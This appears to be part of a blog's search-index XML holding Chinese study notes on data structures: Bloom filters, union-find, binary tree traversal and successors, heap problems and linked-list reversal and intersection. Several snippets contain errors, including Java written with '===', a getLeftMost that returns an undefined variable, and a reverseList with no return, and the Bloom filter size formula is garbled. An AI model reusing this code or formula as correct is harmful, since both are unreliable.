      <tags>
        <tag>web前端</tag>
        <tag>web前端性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--布隆过滤器]]></title>
    <url>%2F2018%2F02%2F04%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%2F</url>
    <content type="text"><![CDATA[概念 A是一个大的系统，100亿个网页，每个url占用64个字节。B也是一个系统，里面也有url。我想要查询B中的url是否在A中。 最差：将A中的url都做成哈希表，需要大量的空间。 布隆过滤器可以看做一个集合，集合很省空间，可以用于查询。 布隆过滤器有失误率。如果url是A集合的，布隆过滤器一定返回true。如果url不属于A集合，布隆过滤器也可能返回true。 100G内存，利用布隆过滤器20G可以放下，失误率只有十万分之一。 谈布隆过滤器一定有这几个参数 1.样本量N。2.失误率的上限P。 有N和P，就可以设计一个布隆过滤器。与单样本无关。 一个样本添加到布隆过滤器的过程 布隆过滤器大小是m，每一位就是1bit信息。1字节byte是8bit，布隆过滤器是bit组成的数组。m/8是布隆过滤器所需要的字节数byte（实际统计的空间）。 一个单样本通过一个哈希函数，算出一个返回值A。这个返回值A去模上m所得到的数B。这个B代表这个单样本在布隆过滤器的某个位置上。 如果一个样本经过k个哈希函数，得到k个返回值，均模上m得到相应的结果。这些结果都在布隆过滤器上的占据一个位置。 如何检查某个样本是否在布隆过滤器上 一个样本经过同样的k个哈希函数得到的返回值再模上m，得到这些值在布隆过滤器上占有的位置和它应该占有的位置相同，则在。如果有一个位置不同，则不在。 布隆过滤器的局限性 布隆过滤器的m很小，无法判断。 m很大，则准确性极高。 即哈希函数的个数和布隆过滤器的大小是哈希函数的关键。 公式 布隆过滤器的大小： m = （n lnP / ln2 ） （-1）。 哈希函数k的个数：k = 0.7 * (m / n)。 因为m和k可能是小数，所以会四舍五入或者直接取1000等好算的数。这个时候p就会变。此时p如何计算？-真实失误率p： (1-e^(-n * k / m))^k 应用 黑名单系统 大数据时，有一定的失误率，不影响普遍结果，但是节省了大量空间。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--并查集]]></title>
    <url>%2F2018%2F02%2F04%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%B9%B6%E6%9F%A5%E9%9B%86%2F</url>
    <content type="text"><![CDATA[并查集概念 一开始N个节点自成一个集合，即 N个集合。 并查集有find函数，find(a, b)，find节点a,b,并查集告诉你这两个点是不是属于同一个集合的。 unit函数，unit(a, b)，a所在的集合和b所在的集合合并。 并查集的单个集合的结构 是一个单链表类型。 每个节点自己构成一个集合，就是节点上的指针指向自己。 如果一个集合上有多个节点，例如：集合中有a和c，a的指针指向c，c的指针指向自己。我们查找a属于哪个集合，就顺着a的指针向上找，找到了一个节点的指针指向了自己，即c。那么c就是这个集合的代表节点。 如果我想查a和b是否属于一个集合。a找到自己集合的代表节点，b找到自己集合的代表节点，看看这两个节点是否是一个节点，是，则属于一个集合。 并查集在fin的过程中有一个优化：a -&gt; b -&gt; c -&gt; d -&gt; e，e指向自己。在找a和c是否属于一个节点时，会将该链表扁平化。变为a -&gt; e，b -&gt; e，c -&gt; e，d -&gt; e。-合并：假设一个并查集是A，另外一个并查集是B。如何SizeA &gt; SizeB，B就挂在A底下，反之A就挂在B底下。 综上所致，便是并查集 实现代码用HashMap实现了单向链表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public static class DisjointSets &#123; // key是一个node，value是这个node的father public HashMap&lt;Node, Node&gt; fatherMap; // 一个节点node，所在集合的大小 public HashMap&lt;Node, Integer&gt; rankMap; // 建立一个fatherMap和rankMap public DisjointSets () &#123; fatherMap = new HashMap(Node, Node)(); rankMap = new HashMap(Node, Integer)(); &#125; // 初始化 public void makeSets(List&lt;Node&gt; nodes) &#123; fatherMap.clear() rankMap.clear() // 针对每一个node for (Node node : nodes) &#123; // 将每一个node的父，设为自己 fatherMap.put(node, node) // 则，自己所在的集合size就是1 rankMap.put(node, 1) &#125; &#125; public Node findFather(Node n) &#123; // 在fatherMap中拿到节点n的father Node father = fatherMap.get(n) // father是不是自己 if (father != n) &#123; // 找father的fahter，即不断向上查找 father = findFather(father) &#125; // 将当前节点n的father设为不断向上查找后的father fatherMap.put(n, father) return father &#125; // 在使用isSameSet和union两个方法时，请保证输入的方法时maSet过的 // 节点a,节点b是否在同一个集合 public boolean isSameSet(Node a, Node b) &#123; return findFather(a) == findFather(b) &#125; // 合并 public void union(Node a, Node b) &#123; if (a == null || b == null) &#123; return &#125; // 拿到a节点所在结合的代表节点 Node aFather = findFather(a) // 拿到b节点所在结合的代表节点 Node bFather = findFather(b) if (aFather != bFather) &#123; // 拿到集合的size int aFrank = rankMap.get(aFather) int bFrank = rankMap.get(bFather) // 如果aFrank代表的集合的size小，a就挂在b下面 if (aFrank &lt;= bFrank) &#123; // 如果aFather的father节点改为bFather fatherMap.put(aFather, bFather) // 且，bFather所代表的集合的size变大 rankMap.put(bFather, aFrank + bFrank) &#125; else &#123; fatherMap.put(bFather, aFather) rankMap.put(aFather, aFrank + bFrank) &#125; &#125; &#125;&#125; 结论 如果你有N个节点，你想查a，b两个节点是否在同一个集合这个操作，这个操作执行了k次，集合合并的这个操作的次数是f。并且k + f （使用并查集的次数是k + f）是O(n)级别的情况下，则单次时间复杂度是O（1）。 即，你使用并查集查两节点是否是在同一集合的次数是1，不保证时间复杂度是O(1)。但是次数如果多了，则单次时间复杂度是O（1）。 即，并查集的方法调用次数上去了，单次时间复杂度平均下来是O（1）。 应用范围 所有节点Node必须建立成集合 要查询的两个节点来自这些成立的集合 两个集合快速合并和两个节点是否来自于同一个集合，这两个操作的次数上去了O(N)，单次操作（快速合并和两个节点是否来自于同一个集合）时间复杂度是O（1）。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--查找后继节点]]></title>
    <url>%2F2018%2F02%2F03%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%9F%A5%E6%89%BE%E5%90%8E%E7%BB%A7%E8%8A%82%E7%82%B9%2F</url>
    <content type="text"><![CDATA[题目在二叉树中找到一个节点的后继节点现在有一种新的二叉树节点类型如下：12345678910public class Node &#123; public int value; public Node left; public Node right; public Node parent; public Node(int data) &#123; this.value = data; &#125;&#125; 后继节点 如果一棵树中，按照中序遍历得到一个序列。 那么，一个节点的后继节点。是在这个序列中，这个节点的下一个节点。 例如:12 34 5 6 7 中序遍历为：4251637。 2的后继节点是5。 解题 一定要中序遍历才能知道后继节点吗？ 例如节点S,如果有右子树，那它的后继节点一定是其右子树最左的边界。 如果无右子树。如果S是节点T的左孩子。那么根据中序遍历，左中右，需要打印T，即T是S的后继节点，T是S的父节点，S是T的左孩子。 如果无右子树。如果S是节点T的右孩子，且T也是右孩子，S找T，T找他的父，如果他的父也只右孩子，继续向上找。如果找到一个节点A，A是我父的左孩子，那么A的父是S的后继节点。 上述情况中的S,其实本质是某个父节点的左子树的终结点，所以我们要找到这个某个父节点。它就是S的后继节点。 这样的找法，不需要遍历二叉树，你的代价仅仅是当前节点距离这个节点的距离。 关键代码12345678910111213141516171819202122232425262728293031public static Node getSuccessorNode (Node node) &#123; if (node === null) &#123; return node &#125; // 说明节点有右子树，后继节点在右子树的左边界 if (node.right != null) &#123; return getLeftMost(node.right) &#125; else &#123; // 找到父 Node parent = node.parent // 节点是不是父节点的左孩子，不是，向上循环找到一个节点是父节点的左孩子。后继节点就是这个节点的父节点 // 节点是左孩子，后继节点就是这个节点的父节点 // parent不为null，是因为有的节点没有后继节点。例如一棵树的最后一个节点。 while (parent != null &amp;&amp; parent.left != node) &#123; node = parent parent = node.parent &#125; return parent &#125;&#125;// 一个节点最左的节点public static Node getLeftMost (Node node) &#123; if (node === null) &#123; return node &#125; while (node.left != null) &#123; node = node.left &#125; return parent&#125; 其实我们可以看出来，一个二叉树结构定了，一切都定了。我们只是规定如何去遍历它（先中后序），如果找一些概念上的节点（后继节点）。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--二叉树：遍历（非递归）]]></title>
    <url>%2F2018%2F02%2F03%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E4%BA%8C%E5%8F%89%E6%A0%91%EF%BC%9A%E9%9D%9E%E9%80%92%E5%BD%92%E9%81%8D%E5%8E%86%2F</url>
    <content type="text"><![CDATA[题目 二叉树先序、中序、后序递归遍历。 非递归版本非常重要，弄懂细节。 二叉树的递归行为理解 例如先序：递归是打印以head为头的整棵树，但是打印的方式是先打印当前，再打印左子树，再打印右子树。 那么先序遍历改为非递归，即先将我的头部加到栈里去。先加右，再加左。再拿出一个打印。一次循环。 中序遍历，是将节点的所有左边界加入到栈里去，然后弹出栈。1.当head来到null，就弹出，弹出后，head就指向右孩子。2.head不为null，就加左边界，同时head再指向左。 中序遍历，即整棵树被左边界所分解。这件事就变成了，我逆序打印我的左边界。 先序遍历（非递归）123456789101112131415161718192021222324252627public static void preOrderUnRecur(Node head) &#123; System.out.print(&quot;pre-order: &quot;); if (head != null) &#123; Stack&lt;Node&gt; stack = new Stack&lt;Node&gt;(); // 先压栈头节点 stack.add(head); while (!stack.isEmpty()) &#123; // 第一次弹出头节点，打印 // 第二次弹出第一次的左孩子或者右孩子，并打印 // 即弹出就打印，记得栈是先入后出 head = stack.pop(); System.out.print(head.value + &quot; &quot;); // 第一次右孩子不等于null，压入右孩子 // 第二次的右孩子不等于null，压入右孩子 // 即先压右孩子再压左孩子 if (head.right != null) &#123; stack.push(head.right); &#125; // 第一次左孩子不等于null，压入左孩子 // 第二次的左孩子不等于null，压入左孩子 if (head.left != null) &#123; stack.push(head.left); &#125; &#125; &#125; System.out.println();&#125; 中序遍历（非递归）先左，再中，再右123456789101112131415161718192021222324252627public static void inOrderUnRecur(Node head) &#123; System.out.print(&quot;in-order: &quot;); if (head != null) &#123; // 准备一个栈 Stack&lt;Node&gt; stack = new Stack&lt;Node&gt;(); while (!stack.isEmpty() || head != null) &#123; // 第一次，head非空，压入head // 第二次，head指向第一次的左孩子，就会压入第一次的左孩子 // 即，遇到一棵树，head不为空，我就将这棵树的左边界全部压入栈中。 // head为空，就弹出，打印，且让head向右边窜。 if (head != null) &#123; stack.push(head); // 第一次，head指向左孩子 head = head.left; &#125; else &#123; // 栈非空，head指向的左孩子是null head = stack.pop(); // 从栈中弹出节点并打印 // 即根据head是否指向null，弹出节点，并打印，且让head向右边窜。 System.out.print(head.value + &quot; &quot;); // head指向当前的右孩子 head = head.right; &#125; &#125; &#125; System.out.println();&#125; 后序遍历（非递归）先左，再右，再中 先序遍历时，先压中，再压右，再压左。打印为中左右 我们的压栈顺序改为中左右，打印为中右左 我们的后序遍历要求的打印顺序为左右中，即上一步压栈顺序改为中左右后，打印为中右左。我们不打印，再压入另外一个栈，再打印，就逆序了。是左右中。123456789101112131415161718192021222324public static void posOrderUnRecur1(Node head) &#123; System.out.print(&quot;pos-order: &quot;); if (head != null) &#123; Stack&lt;Node&gt; s1 = new Stack&lt;Node&gt;(); Stack&lt;Node&gt; s2 = new Stack&lt;Node&gt;(); s1.push(head); while (!s1.isEmpty()) &#123; head = s1.pop(); // 要打印的时候，不打印，头节点压入s2中 s2.push(head); if (head.left != null) &#123; s1.push(head.left); &#125; if (head.right != null) &#123; s1.push(head.right); &#125; &#125; // 打印s2 while (!s2.isEmpty()) &#123; System.out.print(s2.pop().value + &quot; &quot;); &#125; &#125; System.out.println();&#125; 1234567891011121314151617181920public static void posOrderUnRecur2(Node h) &#123; System.out.print(&quot;pos-order: &quot;); if (h != null) &#123; Stack&lt;Node&gt; stack = new Stack&lt;Node&gt;(); stack.push(h); Node c = null; while (!stack.isEmpty()) &#123; c = stack.peek(); if (c.left != null &amp;&amp; h != c.left &amp;&amp; h != c.right) &#123; stack.push(c.left); &#125; else if (c.right != null &amp;&amp; h != c.right) &#123; stack.push(c.right); &#125; else &#123; System.out.print(stack.pop().value + &quot; &quot;); h = c; &#125; &#125; &#125; System.out.println();&#125;]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--二叉树：遍历（递归）]]></title>
    <url>%2F2018%2F02%2F02%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E4%BA%8C%E5%8F%89%E6%A0%91%EF%BC%9A%E9%80%92%E5%BD%92%E9%81%8D%E5%8E%86%2F</url>
    <content type="text"><![CDATA[题目二叉树先序、中序、后序递归遍历 ###二叉树 先序遍历（递归） 对于每个节点。先打印当前节点，再打印左子树，再打印右子树。 递归的将函数的所有信息压栈，系统就能清楚的知道函数执行到哪一行，变量是什么。12345678910public static void preOrderRecur(Node head) &#123; if (head == null) &#123; return; &#125; System.out.print(head.value + &quot; &quot;); // 递归左子树 preOrderRecur(head.left); // 递归右子树 preOrderRecur(head.right);&#125; 中序遍历（递归）先左，再中，再右12345678public static void inOrderRecur(Node head) &#123; if (head == null) &#123; return; &#125; inOrderRecur(head.left); System.out.print(head.value + &quot; &quot;); inOrderRecur(head.right);&#125; 后序遍历（递归）先左，再右，再中12345678public static void posOrderRecur(Node head) &#123; if (head == null) &#123; return; &#125; posOrderRecur(head.left); posOrderRecur(head.right); System.out.print(head.value + &quot; &quot;);&#125;]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--二叉树：打印折痕]]></title>
    <url>%2F2018%2F02%2F01%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E4%BA%8C%E5%8F%89%E6%A0%91%EF%BC%9A%E6%89%93%E5%8D%B0%E6%8A%98%E7%97%95%2F</url>
    <content type="text"><![CDATA[打印折痕题目：纸条，由下到上对折三次，折痕方向为：1：下2：下上3：下上下上。这是一棵树，头节点是下折痕，每一棵左子树头节点都是下折痕，每一棵右子树头节点都是上折痕。打印所有子树，就是先左再中再右的中序遍历。 关键代码1234567891011121314151617public static void printAllFolds (int N) &#123; printProcess(1, N, true)&#125;public static void printProcess(int i, int N, boolean down) &#123; // 当前节点是第i层，总共是n层 // 当前节点是下折痕嘛？是 down为true，不是 down为false // 先进入true树，返回当前节点打印。再进入false树，返回当前节点打印。在返回true树。。。 // 即这是一个遍历二叉树的过程。 // 这也是为什么我们总结：这是一棵树，头节点是下折痕，每一棵左子树头节点都是下折痕，每一棵右子树头节点都是上折痕。 if (i &gt; N) &#123; return &#125; printProcess(i + 1, N, true) System.out.println(down ? &quot;down&quot; : &quot;up&quot;) printProcess(i + 1，N, false)&#125; 递归的优势 我们从当前true1树，先进入true2树，在返回当前true1树的过程中,true2树所占用的空间被垃圾收集掉。 如图所示，我们所占用的空间永远是常数级，是二叉树的高度。 这种递归的遍历二叉树，可以极大的减少我们空间的损耗。 而如果我们准备一个超大数组，去填下down或up，数组会爆栈。 ###非递归 自己做个栈压true或者false 到达第一个true，1，L1（第一层），压入 到达第二个true，1，L2（第二层），压入 到达第三个true，1，L3（第三层），压入 到达第四个true，1，L4（第四层），压入，但是return了，所以弹出。 返回第三个true，2（第二次碰到它）,L3。打印 达到第四个false，弹出。 返回第三个true，2（第三次碰到它）,L3。弹出。 再到第二个true，2（第二次碰到它）,L2。打印。 非递归其实就是自己给自己压栈出栈。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--堆的应用（三）]]></title>
    <url>%2F2018%2F01%2F31%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%A0%86%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[题目输入：参数1，正数数组costs参数2，正数数组profits参数3，正数k参数4，正数m costs[i]表示i号项目的花费profits[i]表示i号项目在扣除花费之后还能挣到的钱（利润）k表示你不能并行，只能串行的最多做k个项目m表示你初始的资金 说明：你每做完一个项目，马上获得的收益，可以支持你去做下一个项目。 输出：你最后获得的最大钱数。 举例 有项目[1000，500，200，100，50，10]，有本金[100]。 此时你能做的项目是[100，50，10]。那么你选择收益最大的项目做。 例如，你做完50的项目收益最大，做完你的总钱数变成200。 即：总钱数去解锁你可以做的项目，解锁的项目中选择利润最大的，加入你的总钱数。继续解锁，再选择再做。 关键代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859public class Node &#123; // 利润 public int p // 花费 public int c public Node (int p, int c) &#123; this.p = p this.c = c &#125;&#125;// 第一个比较器，按照花费最低组成一个小根堆// 即谁的花费小放在最上面public static class MinCostComparator implements Comparator&lt;Node&gt; &#123; public int compare(Node o1, Node o2) &#123; return o1.c - o2.c &#125;&#125;// 按照收益最大，组成大根堆// 即谁的收益大放在最上面public static class MaxProfitComparator implements Comparator&lt;Node&gt; &#123; public int compare(Node o1, Node o2) &#123; return o2.p - o1.p &#125;&#125;// 开始做项目public static int findMaximizedCapital(int k, int w, int [] Profits, int[] Capital) &#123; // 将所有的项目收益和花费组成新的node放入数组中 Node[] nodes = new Node[Profits.length] for (int i = 0; i &lt; Profits.length; i++) &#123; nodes[i] = new Node(Profits[i], Capital[i]) &#125; // 生成一个代价小就往上的小根堆 PriorityQueue&lt;Node&gt; minCostQ = new PriorityQueue&lt;&gt;(new MinCostComparator()) // 生成一个收益大就往上的大根堆 PriorityQueue&lt;Node&gt; maxProfitQ = new PriorityQueue&lt;&gt;(new MaxProfitComparator()) // 根据代价建立小根堆 for (int i = 0; i &lt; nodes.length; i++) &#123; minCostQ.add(nodes[i]) &#125; for (int i = 0; i &lt; k; i++) &#123; // 如果小根堆，堆顶项目的花费小于我的总资金w while (!minCostQ.isEmpty() &amp;&amp; minCostQ.peek().c &lt;= w) &#123; //那么这个项目从我的小根堆里弹出，放在我的大根堆中 // 但是这个大根堆是按照收益排的 // 这是一个解锁池，堆顶是收益最大的项目 maxProfitQ.add(minCostQ.poll()) &#125; // 解锁池为空，无项目可解锁，无项目可干，返回 if (maxProfitQ.isEmpty()) &#123; return w &#125; // 选择一个收益最大的做（堆顶），累计收益 w += maxProfitQ.poll().p &#125; return w&#125; 即总资金去解锁项目放入解锁池，做完以后。总资金再去解锁项目放入解锁池，再做。 即锁池只关注代价最小，解锁池只关注代价最大。复杂度 建所有项目O(N)。 建立小根堆O(N)。 从小根堆弹，进入大根堆O(logN)。 总的复杂度：O(N*logN)。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--堆的应用（二）]]></title>
    <url>%2F2018%2F01%2F30%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%A0%86%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[贪心问题题目：一块金条切成两半，是需要花费和长度数值一样的铜板的。比如长度为20的金条，不管切成长度多大的两半，都要花费20个铜板。一群人想整分整块金条，怎么分最省铜板？ 例如，给定数组[10, 20, 30]，代表一共三个人，整块金条长度为10 + 20 + 30 = 60.金条要分成10, 20, 30三个部分。如果，先把长度60的金条分成10和50，花费60。再把长度50的金条分成20和30，花费50。一共花费110铜板。 但是，如果先把长度60的金条分成30和30，花费60。再把长度30的金条分成10和20，花费30。一共花费90铜板。 输入一个数组，返回分割的最小代价。 实质 怎样生成一棵树，堆顶的值最小？ 一棵树堆顶的代价，是左孩子 + 右孩子。 例如：60的金条要分成10, 20, 30三个部分。用树表示开销最小的方式是： 那么整个的代价就是非叶节点的代价，60 + 30 = 90。 即：把所有的数组成一个小根堆，每次弹两个。这弹出的两个生成一个新的节点加回去。再弹出两个，再生成一个新的节点加回去。 即这个小根堆，最小的两个节点先合，再合大的。 这就是哈弗曼树生成。 生成哈弗曼树举例 堆：1，3，6，9，15。 弹出1，3；生成节点4。 将4放回堆中。 4，6，9，15。 弹出4，6；生成节点10。 将10放回堆中。 9，10，15。 19，15 34 最终得到的代价一定是最低的。 特点合并的时候不分顺序，使用哈夫曼编码。 关键代码12345678910// pQ树的size大于1，小于等于1无法抛出两个节点合并while (pQ.size() &gt; 1) &#123; // pQ树抛出两次 cur = pQ.poll() + pQ.poll() // 代价是非叶节点的值，所以加上 sum += cur // 新的值扔回pQ pQ.add(cur)&#125;return sum 注意，优先级队列默认是小根堆，利用比较器可将小根堆转换为大根堆。当生成优先级队列时，将你的comparator扔进去，它就会按照你的想法组织是大根堆还是小根堆。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--堆的应用(一)]]></title>
    <url>%2F2018%2F01%2F29%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%A0%86%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[随时找到数据流的中位数题目：有一个源源不断吐出整数的数据流，假设你有足够的空间来保存吐出的数。请设计一个名叫MedianHolder的结构，MedianHolder可以随时取得之前吐出所有数的中位数。 要求：1、如果MedianHolder已经保存了吐出的N个数，那么任意时刻将一个新数加入到MedianHolder的过程，其时间复杂度是O(logN)。2、取得已经吐出的N个数整体的中位数的过程，时间复杂度为O（1）。 较差方法 准备一个数组，向数组内push数。数组满了以后，需要扩容。每次扩容后，继续push数。 取中位数的时候，排序，再取出中位数。 当已经加入n个数时，最起码经过n * logN的排序过程。 所以每次取中位数时，时间复杂度是n * logN。 数组扩容：ArrayList底层是动态数组，找index位置元素快，扩容容易。但是remove元素慢，因为每删除一个元素都需要对整个数组进行重新调整。linkedList底层是双向链表结构，找Index位置的元素慢，但是remove快。 使用堆 建立一个大根堆和一个小根堆。 整个数组从小到大排序之后，前 N /2 放在大根堆里，后 N / 2放在小根堆里，这样大根堆的堆顶和小根堆的堆顶正好压中中位数。 如何建立堆 第一个数放在大根堆 再放入数时，比大根堆堆顶大的放在小根堆里，比大根堆堆顶小的放在大根堆中。 当大根堆的size和小根堆的size相差1，大根堆中堆顶弹出一个，进入到小根堆。或者小根堆中堆顶弹出一个，进入到大根堆。 如何操作堆 向堆中加入元素：heapInsert。 弹出堆顶：size–，最后一个元素放在头部，堆顶的元素弹出，heapify。 关键代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public void addNumber (int num) &#123; // 大根堆是空直接添加num if (this.maxHeap.isEmpty()) &#123; this.maxHeap.add(num) return &#125; // 如果大根堆顶大于num，进大根堆 if (this.maxHeap.peek() &gt;= num) &#123; this.maxHeap.add(num) &#125; else &#123; if (this.minHeap.isEmpty()) &#123; this.minHeap.add(num) return &#125; if (this.minHeap.peek() &gt; num) &#123; this.maxHeap.add(num) &#125; else &#123; this.minHeap.add(num) &#125; &#125; modifyTwoHeapSize()&#125;// 堆调平private void modifyTwoHeapsSize () &#123; if (this.maxHeap.size() == this.minHeap.size() + 2) &#123; // 小根堆弹一个进大根堆 this.minHeap.add(this.maxHeap.poll()) &#125; if (this.minHeap.size() == this.maxHeap.size() + 2) &#123; this.maxHeap.add(this.minHeap.poll()) &#125;&#125;// 取中位数public Integer getMedian () &#123; int maxHeapSize = this.maxHeap.size() int minHeapSize = this.minHeap.size() if (maxHeapSize + minHeapSize === 0) &#123; return null &#125; Integer maxHeapHead = this.maxHeap.peek() Integer minHeapHead = this.minHeap.peek() if ((maxHeapSize + minHeapSize) &amp; 1) == 0) &#123; // 偶数，返回两个堆顶除以2的值 return (maxHeapHead + minHeapHead) / 2 &#125; // 奇数返回Size较大的那个头 return maxHeapSize &gt; minHeapSize ? maxHeapHead : minHeapHead&#125; 这里用到了Java优先级队列库 优先级队列就是尾部加一个数，经过一个HeapInsert poll（）操作，堆顶弹出，当前堆末尾元素放在堆顶，经过一个heapify。 复杂度 一个数插入的复杂度是O(logN)。 poll操作复杂度是O(logN)。 得到中位数的操作是O(1)。 总结当你需要关注一系列数的最大值和最小值，取出最大值或最小值以后还能再取得最大值和最小值，这就需要堆结构。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--链表（六）]]></title>
    <url>%2F2018%2F01%2F27%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E9%93%BE%E8%A1%A8%EF%BC%88%E5%85%AD%EF%BC%89%2F</url>
    <content type="text"><![CDATA[反转链表题目：分别实现反转单向链表和反转双向链表的函数要求：如果链表长度为N，时间复杂度要求为O(N)，额外空间复杂度要求为O(1) 反转单向链表–关键代码12345678910111213141516171819public static class Node &#123; public int value; public Node next; public Node (int data) &#123; this.value = data; &#125;&#125;public static Node reverseList (Node head) &#123; Node pre = null; Node next = null; while (head != null) &#123; next = head.next; head.next = pre; pre = head; head = next; &#125;&#125; 反转双向链表关键代码12345678910111213141516171819202122public static class DoubleNode &#123; public int value; public DoubleNode last; public DoubleNode next; public DoubleNode (int data) &#123; this.value = data; &#125;&#125;public static DoubleNode reverseList (DoubleNode head) &#123; DoubleNode pre = null DoubleNode next = null while (head != null) &#123; next = head.next; head.next = pre; head.last = next; pre = head; head = next; &#125; return pre;&#125;]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--链表（五）]]></title>
    <url>%2F2018%2F01%2F25%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E9%93%BE%E8%A1%A8%EF%BC%88%E4%BA%94%EF%BC%89%2F</url>
    <content type="text"><![CDATA[链表生存题目-链表相交题目：在本题中，单链表可能有环，也可能无环。给定两个单链表的头节点head1和head2，这两个链表可能相交，也可能不相交。请实现一个函数，如果两个链表相交，请返回相交的第一个节点；如果不相交，返回null即可。要求：如果链表1的长度为N，链表2的长度为M，时间复杂度请达到O(N + M)，额外空间复杂度请达到O(1)。 思路 到底有环还是无环，需要一个函数求第一个入环节点。如果链表无环返回null，有环返回第一个入环函数。 map比较的是内存地址，不比值。 求解入环函数（map版本） 如何求入环节点？遍历一个链表，在链表上的node点放入map中，由于链表形成环，会有一个节点再次进入哈希map表中。例如 1 -&gt; 2 -&gt; 3 -&gt; 4 -&gt; 5，而5指向之前的2，那么这个2就是第一个入环节点，会再次进入哈希map表中。 求解入环函数（非map版本） 遍历链表，慢指针一次走一步，快指针一次走两步，如果无环链表，快指针一定会指向null。 遍历链表，慢指针一次走一步，快指针一次走两步，如果有环链表，快指针和慢指针一定会在环上相遇。相遇后，有一个结论：相遇后，快指针回到开头，接下来，快指针变为一次走一步，慢指针留在原地仍一次走一步，那么，快指针和慢指针一定会在第一个入环节点处相遇。 求解相交 已知链表1的头head1，第一个入环节点loop1；链表2的头head2，第二个入环节点loop2。 如果loop1为null，loop2为null，问题为两个无环节点的相交问题。 两个无环链表相交 使用map。首先遍历head1的链表放入map。然后再遍历head2的链表，对于head2中的节点，第一次发现head2的节点已经在map中了，那么这就是第一次相交的节点。 不使用map。找head1的最后一个节点last1，可能在链表1的第100个节点上。找head2的最后一个节点last2，可能在链表2的第80个节点上。那么如果两个无环链表相交，那么他们的最后一个节点一定相同；不相同，则不相交。 如何不用map找第一个相交节点呢？长度为100的链表先走20步，然后和长度80的一起走，他们一定会共同走进相交的部分。 一个链表有环和一个链表无环这种情况两个链表不可能相交。 两个链表都有环 三种结构：1.两个链表都有环，不想交。2.两个链表很早相交了，有一个共有的环。3.两个链表共享一个环。 结构一 这里loop1和loop2（第一个入环节点），都不为空，且相等，那么就是上结构。如何求此结构的相交节点？这两个链表以loop1为结尾，不看成环部分，那么问题就变为两个无环链表的相交问题了，考察它的第一个入环节点即可。 结构二 如果loop1通过next指针一直向下走，在走的过程中碰到loop2便是上结构。loop1和loop2都是第一个相交节点。 结构三- 如果loop1通过next指针一直向下走，走到回来了，还没碰到loo2便是上结构。无相交节点。 代码12345678910111213141516171819public static Node getIntersectNode (Node head1, Node head2) &#123; if (head1 == null || head2 == null) &#123; return null &#125; // 得到链表1和2第一个入环节点 Node loop1 = getLoopNode(head1) Node loop2 = getLoopNode(head2) // 无环链表相交问题 // 要返回无环链表的第一个相交节点 if (loop1 == null &amp;&amp; loop2 == null) &#123; return noLoop(head1, head2) &#125; // 两个有环链表相交问题 if (loop1 != null &amp;&amp; loop2 != null) &#123; return bothLoop(head1, loop1, head2, loop2) &#125; // 说明一个链表有环，一个无环，不可能相交 return null&#125; 123456789101112131415161718192021222324252627282930// 得到第一个入环节点函数public static Node getLoopNode (Node head) &#123; if (head == null || head.next == null || head.next.next == null) &#123; return null &#125; // n1是慢指针，一次走一步 // n2是快指针，一次走两步 Node n1 = head.next Node n2 = head.next.next while (n1 != n2) &#123; // 有一个为null，说明没有入环节点，返回null if (n2.next == null || n2.next.next == null) 